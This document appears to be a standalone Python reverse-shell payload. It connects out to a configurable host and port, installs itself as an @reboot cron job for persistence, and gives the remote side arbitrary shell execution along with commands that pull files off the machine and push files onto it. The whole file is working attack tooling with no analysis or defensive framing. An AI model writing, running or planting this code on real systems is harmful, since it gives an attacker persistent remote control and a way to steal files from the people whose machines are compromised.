#!/usr/bin/env python3

import socket
import subprocess
import os

# --- Configuration ---
TARGET_HOST = "127.0.0.1"  # Replace with your host IP if needed for external testing
TARGET_PORT = 12345        # You can choose any port above 1024

# --- Persistence (Linux - cron job) ---
def create_persistence():
    """Creates a cron job to run the script on startup (Linux)."""
    try:
        script_path = os.path.abspath(__file__) # Get the full path of the script
        cron_command = f"@reboot python3 {script_path} &" # Run on reboot, in the background
        os.system(f"(crontab -l ; echo '{cron_command}') | crontab -")
        print(f"[*] Persistence (cron job) added to crontab for {script_path}")
    except Exception as e:
        print(f"[!] Error adding persistence: {e}")

# --- Reverse Shell Logic ---
try:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((TARGET_HOST, TARGET_PORT))
    # At this point, the connection is established

    print(f"[*] Payload connected to {TARGET_HOST}:{TARGET_PORT}")
    create_persistence() # Call the function to add persistence

    current_dir = os.getcwd()
    client_socket.send(current_dir.encode()) # Send current directory to the attacker

    while True:
        command = client_socket.recv(1024).decode().strip()

        if command.lower() == 'exit':
            break
        elif command.lower().startswith('download'):
            try:
                filename = command.split()[1]
                print(f"[*] Payload trying to open: {filename}") # Debugging print
                with open(filename, 'rb') as f:
                    print(f"[*] Payload opened: {filename}") # Debugging print
                    while True:
                        chunk = f.read(1024)
                        if not chunk:
                            print("[*] Payload reached end of file.") # Debugging print
                            break
                        print(f"[*] Payload sending chunk of size: {len(chunk)}") # Debugging print
                        client_socket.send(chunk)
                client_socket.send(b"<FILE_END>") # Signal the end of the file
                print("[*] Payload sent <FILE_END> signal.") # Debugging print
            except Exception as e:
                client_socket.send(f"Error downloading file: {e}".encode())
                print(f"[!] Payload error: {e}") # Debugging print
        elif command.lower().startswith('upload'):
            try:
                filename = command.split()[1]
                with open(filename, 'wb') as f:
                    while True:
                        chunk = client_socket.recv(1024)
                        if chunk == b"<FILE_END>":
                            break
                        f.write(chunk)
                client_socket.send("File uploaded successfully".encode())
            except Exception as e:
                client_socket.send(f"Error uploading file: {e}".encode())
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_result = process.stdout.read()
            stderr_result = process.stderr.read()
            output = stdout_result + stderr_result
            client_socket.send(output)

except Exception as e:
    print(f"An error occurred: {e}")
finally:
    if 'client_socket' in locals():
        client_socket.close()
